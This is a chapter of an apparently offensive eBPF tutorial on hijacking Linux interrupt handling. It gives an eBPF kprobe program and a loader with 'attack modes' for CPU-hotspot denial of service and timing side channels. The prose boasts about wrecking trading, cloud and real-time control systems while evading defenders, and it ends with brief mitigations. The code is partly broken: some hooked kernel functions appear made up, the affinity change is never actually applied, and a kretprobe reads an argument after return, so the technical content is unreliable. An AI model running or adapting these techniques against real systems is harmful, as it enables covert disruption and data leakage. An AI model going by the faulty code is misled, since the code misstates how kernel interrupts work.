# IRQ Affinity Chaos: Weaponizing Interrupt Handling

**Chapter 12: Act II Finale - Orchestrating System Chaos**

We're reaching the climax of Act II. You've conquered every major security mechanism, stolen credentials, achieved perfect stealth, and learned to exist in multiple realities. Now it's time for the grand finale: turning the entire system against itself.

This is where our story becomes about total system control. You've been operating stealthily, but what if you wanted to cause chaos? What if you wanted to demonstrate that you don't just own the security mechanisms—you own the entire system?

Interrupts are the nervous system of your computer—they're how hardware talks to the kernel, how timers fire, how network packets get processed. They're supposed to be predictable, well-balanced, and invisible to userspace.

But what if we could mess with that nervous system? What if we could make interrupts fire on the wrong CPUs, at the wrong times, or not at all? What if we could turn the interrupt system into our personal chaos engine?

This completes Act II. You now understand that eBPF doesn't just give you access to systems—it gives you the power to orchestrate reality itself. But we're not done yet. Act III is where we push the boundaries even further.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Hardware Interrupt] -->|1. Generated| B[Interrupt Controller]
    B -->|2. Delivery| C[CPU Core Selection]
    D[eBPF Program] -->|3. Hook & Manipulate| C
    C -->|4. Modified Routing| E[Targeted CPU Core]
    F[Normal Workload] -->|5. Performance Impact| G[Resource Starvation]
    H[Side-Channel] -->|6. Timing Analysis| I[Information Leakage]
    J[System Monitor] -->|7. Degraded Performance| K[Unexplained Issues]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    style I fill:#922b21,stroke:#f5b7b1,stroke-width:2px
    style J fill:#1a5276,stroke:#85c1e9,stroke-width:2px
    style K fill:#21618c,stroke:#85c1e9,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/core-api/irq/index.html" "IRQ Documentation"
    click C "https://www.kernel.org/doc/html/latest/core-api/irq/irq-affinity.html" "IRQ Affinity Documentation"
    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
```



**Why System Stability Just Became Optional**

Here's what most people don't realize about interrupts: they're everywhere. Every keystroke, every network packet, every timer tick—it all goes through the interrupt system. And the kernel has to handle them all, perfectly, millions of times per second.

But what happens when that perfect choreography gets disrupted? What happens when interrupts start landing on the wrong CPU cores, or when critical interrupts get delayed, or when the interrupt load becomes completely unbalanced?

That's where IRQ chaos gets dangerous. We can make systems slow to a crawl by forcing all interrupts onto a single CPU core. We can create covert channels by modulating interrupt timing. We can even crash systems by overwhelming specific interrupt handlers.

The beautiful part is that this looks like normal system behavior gone wrong. Performance monitoring tools will show high interrupt rates, but they won't show that we're the ones orchestrating the chaos. It's like being able to conduct a symphony of system instability while sitting in the audience.

## How We Orchestrate System Chaos

### Understanding the Interrupt Orchestra

The Linux interrupt system is like a massive orchestra where every musician needs perfect timing:
- **Hardware Interrupts**: The instruments (devices) that need the conductor's (CPU's) attention
- **Interrupt Controller**: The conductor's baton that decides who plays when
- **IRQ Handlers**: The sheet music (kernel functions) that tells each CPU what to do
- **SMP IRQ Affinity**: The seating chart that decides which CPU core handles which interrupts
- **/proc/irq/*/smp_affinity**: The interface where we can rearrange the seating

In multi-core systems, spreading interrupts across cores is like having multiple conductors—it keeps the performance smooth and balanced.

```
┌─────────────────────────────────────────────────────────────┐
│                      Hardware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Network Card  │      │ Disk          │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Interrupt Controller                   │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                 IRQ Routing Logic                      │  │
│  └───────┬───────────────────────┬───────────────────────┘  │
│          │                       │                          │
└──────────┼───────────────────────┼──────────────────────────┘
           │                       │
┌──────────▼───────┐     ┌─────────▼────────┐                  
│  CPU Core 0      │     │  CPU Core 1      │                  
│                  │     │                  │                  
│  ┌────────────┐  │     │  ┌────────────┐  │                  
│  │ IRQ Handler│  │     │  │ IRQ Handler│  │                  
│  └────────────┘  │     │  └────────────┘  │                  
│                  │     │                  │                  
└──────────────────┘     └──────────────────┘                  
```

Here's what happens when we use eBPF to mess with the orchestra:

```
┌─────────────────────────────────────────────────────────────┐
│                      Hardware                               │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Network Card  │      │ Disk          │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Interrupt Controller                   │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                 IRQ Routing Logic                      │  │
│  └───────┬───────────────────────┬───────────────────────┘  │
│          │                       │                          │
│  ┌───────▼───────┐               │                          │
│  │ eBPF Program  │───────────────┘                          │
│  └───────────────┘                                          │
│                                                             │
└──────────┬───────────────────────┬──────────────────────────┘
           │                       │
┌──────────▼───────┐     ┌─────────▼────────┐                  
│  CPU Core 0      │     │  CPU Core 1      │                  
│  (Overloaded)    │     │  (Underutilized) │                  
│  ┌────────────┐  │     │  ┌────────────┐  │                  
│  │ IRQ Handler│  │     │  │ IRQ Handler│  │                  
│  └────────────┘  │     │  └────────────┘  │                  
│                  │     │                  │                  
└──────────────────┘     └──────────────────┘                  
```

### How We Conduct the Chaos Symphony

Our strategy is to mess with the interrupt orchestra's timing and seating arrangements:

1. **Hook the Conductors**: We attach to functions like [`irq_dispatch()`](https://elixir.bootlin.com/linux/latest/source/kernel/irq/handle.c) that decide which CPU handles which interrupt
2. **Rearrange the Seating**: We modify CPU affinity masks to force interrupts onto specific cores
3. **Create Traffic Jams**: We pile multiple high-frequency interrupts onto the same CPU core
4. **Build Covert Channels**: We use timing differences in interrupt handling to leak information
5. **Look Innocent**: We make the performance problems look like natural system load, not an attack

The beauty is that we're not breaking anything—we're just making the system perform really, really badly in ways that look accidental.

### Building Our Interrupt Chaos Engine

```c
// @interactive: true
// @copyable: true
// IRQ Affinity Chaos - eBPF exploitation proof of concept
// This demonstrates manipulating interrupt handling for attacks

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/interrupt.h>
#include <linux/irq.h>
#include <linux/cpumask.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_IRQS 256
#define MAX_CPUS 64
#define MAX_COMM_LEN 16

// Structure to track IRQ events
struct irq_event {
    u32 irq;                // IRQ number
    u32 cpu;                // CPU that handled the IRQ
    u64 timestamp;          // Event timestamp
    u64 duration;           // Processing time
    u8 comm[MAX_COMM_LEN];  // Command name of current process
};

// Structure to track IRQ timing for side-channel attacks
struct timing_data {
    u32 irq;                // IRQ number
    u64 duration;           // Processing time
    u64 timestamp;          // When the measurement was taken
};

// Map to store IRQ affinity settings
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // IRQ number as key
    __uint(value_size, sizeof(u64)); // CPU mask as value
    __uint(max_entries, MAX_IRQS);
} irq_affinity_map SEC(".maps");

// Map to track IRQ timing for side-channel attacks
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // IRQ number as key
    __uint(value_size, sizeof(u64)); // Start time as value
    __uint(max_entries, MAX_IRQS);
} irq_timing_map SEC(".maps");

// Map to store timing data for side-channel analysis
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(struct timing_data));
    __uint(max_entries, 1024);
} timing_data_map SEC(".maps");

// Map to track target IRQs we want to manipulate
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // IRQ number as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_IRQS);
} target_irqs SEC(".maps");

// Map to track attack mode
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} attack_mode SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if an IRQ is one we want to manipulate
static __always_inline bool is_target_irq(u32 irq) {
    // Check if this IRQ is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_irqs, &irq);
    if (target && *target == 1)
        return true;
    
    // Network IRQs are often in a specific range
    if (irq >= 40 && irq <= 60)
        return true;
    
    // Disk IRQs are often in a specific range
    if (irq >= 30 && irq <= 35)
        return true;
    
    return false;
}

// Helper function to check if we should create a CPU hotspot
static __always_inline bool should_create_hotspot(void) {
    u32 key = 0;
    u32 *mode = bpf_map_lookup_elem(&attack_mode, &key);
    
    if (mode && *mode == 1)
        return true;
    
    return false;
}

// Helper function to check if we should implement a side-channel
static __always_inline bool should_implement_sidechannel(void) {
    u32 key = 0;
    u32 *mode = bpf_map_lookup_elem(&attack_mode, &key);
    
    if (mode && *mode == 2)
        return true;
    
    return false;
}

// Hook the IRQ affinity setting function
SEC("kprobe/irq_set_affinity")
int BPF_KPROBE(hook_irq_affinity, unsigned int irq, const struct cpumask *mask)
{
    // Get current IRQ information
    u32 irq_num = irq;
    
    // Check if this is an IRQ we want to manipulate
    if (is_target_irq(irq_num)) {
        // Log the event
        struct irq_event event = {};
        event.irq = irq_num;
        event.cpu = bpf_get_smp_processor_id();
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Implement different attack strategies
        if (should_create_hotspot()) {
            // For a DoS attack, we force all interrupts to core 0
            // This is a simplified approach - real implementation would be more sophisticated
            
            // Create a CPU mask with only CPU 0 set
            u64 new_mask = 1; // Bit 0 set, all others clear
            
            // Store the modified mask
            bpf_map_update_elem(&irq_affinity_map, &irq_num, &new_mask, BPF_ANY);
            
            // In a real exploit, we would modify the mask parameter
            // This is simplified for demonstration
        } else if (should_implement_sidechannel()) {
            // For a side-channel attack, we alternate between cores
            // based on timing or other conditions
            
            // Get current time
            u64 now = bpf_ktime_get_ns();
            
            // Create a CPU mask based on timing
            u64 new_mask;
            if (now % 2 == 0) {
                new_mask = 2; // Bit 1 set (CPU 1)
            } else {
                new_mask = 4; // Bit 2 set (CPU 2)
            }
            
            // Store the modified mask
            bpf_map_update_elem(&irq_affinity_map, &irq_num, &new_mask, BPF_ANY);
        }
    }
    
    return 0;
}

// Hook the IRQ handler to implement timing side-channels
SEC("kprobe/handle_irq_event_percpu")
int BPF_KPROBE(hook_irq_handler, unsigned int irq, struct irq_desc *desc)
{
    // Get timing information
    u64 start_time = bpf_ktime_get_ns();
    
    // Store the start time for this IRQ
    u32 key = irq;
    bpf_map_update_elem(&irq_timing_map, &key, &start_time, BPF_ANY);
    
    // Log the event
    struct irq_event event = {};
    event.irq = irq;
    event.cpu = bpf_get_smp_processor_id();
    event.timestamp = start_time;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    
    // Send event to user space
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    
    return 0;
}

// Hook the IRQ handler exit to measure processing time
SEC("kretprobe/handle_irq_event_percpu")
int BPF_KRETPROBE(hook_irq_handler_ret, int ret)
{
    // Get the IRQ number from context
    u32 irq;
    bpf_probe_read_kernel(&irq, sizeof(irq), &PT_REGS_PARM1(ctx));
    
    // Get the end time
    u64 end_time = bpf_ktime_get_ns();
    
    // Look up the start time
    u64 *start_time = bpf_map_lookup_elem(&irq_timing_map, &irq);
    if (start_time) {
        // Calculate processing time
        u64 duration = end_time - *start_time;
        
        // Log the event
        struct irq_event event = {};
        event.irq = irq;
        event.cpu = bpf_get_smp_processor_id();
        event.timestamp = end_time;
        event.duration = duration;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Store the timing information for side-channel analysis
        if (should_implement_sidechannel() && is_target_irq(irq)) {
            struct timing_data tdata = {};
            tdata.irq = irq;
            tdata.duration = duration;
            tdata.timestamp = end_time;
            
            // Use a rolling index to store timing data
            u32 idx = end_time % 1024;
            bpf_map_update_elem(&timing_data_map, &idx, &tdata, BPF_ANY);
        }
    }
    
    return 0;
}

// Hook the IRQ dispatch function to manipulate routing
SEC("kprobe/irq_dispatch_level")
int BPF_KPROBE(hook_irq_dispatch, unsigned int irq, struct irq_desc *desc)
{
    // Check if this is an IRQ we want to manipulate
    if (is_target_irq(irq)) {
        // In a real exploit, we would manipulate the IRQ dispatch
        // This is simplified for demonstration
        
        // Log the event
        struct irq_event event = {};
        event.irq = irq;
        event.cpu = bpf_get_smp_processor_id();
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the IRQ Affinity Chaos eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "irq_chaos.skel.h"

static volatile bool exiting = false;

// Structure for IRQ events (must match the BPF version)
struct irq_event {
    uint32_t irq;
    uint32_t cpu;
    uint64_t timestamp;
    uint64_t duration;
    uint8_t comm[16];
};

// Structure for timing data (must match the BPF version)
struct timing_data {
    uint32_t irq;
    uint64_t duration;
    uint64_t timestamp;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct irq_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] IRQ %d on CPU %d", timestamp, e->irq, e->cpu);
    
    if (e->duration > 0) {
        printf(" (duration: %lu ns)", e->duration);
    }
    
    if (e->comm[0] != '\0') {
        printf(" during process: %s", e->comm);
    }
    
    printf("\n");
}

// Set the attack mode
void set_attack_mode(int map_fd, int mode)
{
    uint32_t key = 0;
    uint32_t value = mode;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to set attack mode: %s\n", strerror(errno));
    } else {
        printf("Attack mode set to: ");
        switch (mode) {
            case 0:
                printf("Monitoring only\n");
                break;
            case 1:
                printf("CPU hotspot (DoS)\n");
                break;
            case 2:
                printf("Side-channel timing\n");
                break;
            default:
                printf("Unknown (%d)\n", mode);
        }
    }
}

// Add an IRQ to the target list
void add_target_irq(int map_fd, int irq)
{
    uint32_t key = irq;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target IRQ: %s\n", strerror(errno));
    } else {
        printf("Added IRQ %d to target list\n", irq);
    }
}

// Analyze timing data for side-channel information
void analyze_timing_data(int map_fd)
{
    struct timing_data tdata;
    uint32_t key;
    
    printf("\n=== TIMING ANALYSIS ===\n\n");
    
    // Simple statistical analysis
    uint64_t min_duration = UINT64_MAX;
    uint64_t max_duration = 0;
    uint64_t total_duration = 0;
    int count = 0;
    
    for (key = 0; key < 1024; key++) {
        if (bpf_map_lookup_elem(map_fd, &key, &tdata) == 0) {
            if (tdata.irq == 0 && tdata.duration == 0)
                continue;
                
            printf("IRQ %u: %lu ns\n", tdata.irq, tdata.duration);
            
            if (tdata.duration < min_duration)
                min_duration = tdata.duration;
                
            if (tdata.duration > max_duration)
                max_duration = tdata.duration;
                
            total_duration += tdata.duration;
            count++;
        }
    }
    
    if (count > 0) {
        printf("\nStatistics:\n");
        printf("  Min: %lu ns\n", min_duration);
        printf("  Max: %lu ns\n", max_duration);
        printf("  Avg: %lu ns\n", total_duration / count);
        printf("  Samples: %d\n", count);
        printf("  Range: %lu ns\n", max_duration - min_duration);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -m MODE   Set attack mode (0=monitor, 1=hotspot, 2=side-channel)\n");
    printf("  -i IRQ    Add IRQ to target list\n");
    printf("  -h        Show this help\n");
}

int main(int argc, char **argv)
{
    struct irq_chaos_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    int attack_mode = 0;  // Default: monitoring only
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:i:h")) != -1) {
        switch (opt) {
            case 'm':
                attack_mode = atoi(optarg);
                break;
            case 'i':
                // We'll add IRQs after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = irq_chaos_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = irq_chaos_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Set attack mode
    set_attack_mode(bpf_map__fd(skel->maps.attack_mode), attack_mode);
    
    // Add target IRQs if specified
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'i' && i + 1 < argc) {
            int irq = atoi(argv[i + 1]);
            add_target_irq(bpf_map__fd(skel->maps.target_irqs), irq);
        }
    }

    printf("IRQ Affinity Chaos eBPF program loaded and running.\n");
    printf("Monitoring IRQ handling...\n");
    printf("Press Ctrl+C to exit and analyze timing data.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

    // Analyze timing data if in side-channel mode
    if (attack_mode == 2) {
        analyze_timing_data(bpf_map__fd(skel->maps.timing_data_map));
    }

cleanup:
    perf_buffer__free(pb);
    irq_chaos_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use CPU Isolation and Pinning**:
   ```bash
   # Reserve CPUs for critical workloads
   systemd-run --property=CPUAffinity=0,1 --property=CPUAccounting=true critical_service
   
   # Pin IRQs to specific CPUs
   echo "2" > /proc/irq/42/smp_affinity  # Pin IRQ 42 to CPU 1
   ```

4. **Monitor IRQ Distribution and Performance**:
   ```bash
   # Monitor IRQ counts per CPU
   watch -n1 'grep . /proc/interrupts'
   
   # Use performance monitoring tools
   perf stat -e irq_vectors:local_timer_entry -a sleep 10
   ```

### Why This Breaks Everything

This IRQ chaos technique is pure fucking gold for wrecking systems:
- **Performance assassination**: Tank specific hardware performance while looking innocent
- **DoS without fingerprints**: Create hardware-level denial of service that looks like "mysterious" system issues
- **Side-channel data extraction**: Use timing attacks to leak sensitive information through interrupt patterns
- **Real-time system destruction**: Completely fuck up time-critical processing guarantees
- **Diagnostic nightmare**: Cause instability that makes sysadmins pull their hair out trying to figure out what's wrong

When you can manipulate IRQ handling at the kernel level, you own the entire performance profile of the system. Cloud platforms, financial trading systems, real-time control systems - they all become your playground. The beauty is that performance "issues" are expected in complex systems, so your attacks blend right into normal operational noise.

### How They'll Try to Catch Us

Smart defenders will be hunting for our IRQ manipulation:
- **eBPF surveillance**: Watching for eBPF programs hooking interrupt handling functions
- **Performance anomaly detection**: Looking for unusual IRQ distribution patterns across CPU cores
- **System health monitoring**: Tracking unexplained performance degradation or CPU hotspots
- **Configuration drift detection**: Monitoring changes to IRQ affinity settings that don't match intended configuration
- **Timing analysis**: Looking for anomalies in interrupt handling timing patterns

But here's the thing - performance issues are so common in complex systems that our attacks look like normal operational problems. By the time they figure out it's an attack, we've already extracted what we need or caused the damage we wanted.

## POC

Companion code: [`ch11-irq-chaos`]({{ site.baseurl }}/dBPF-pocs/pocs/ch11-irq-chaos/)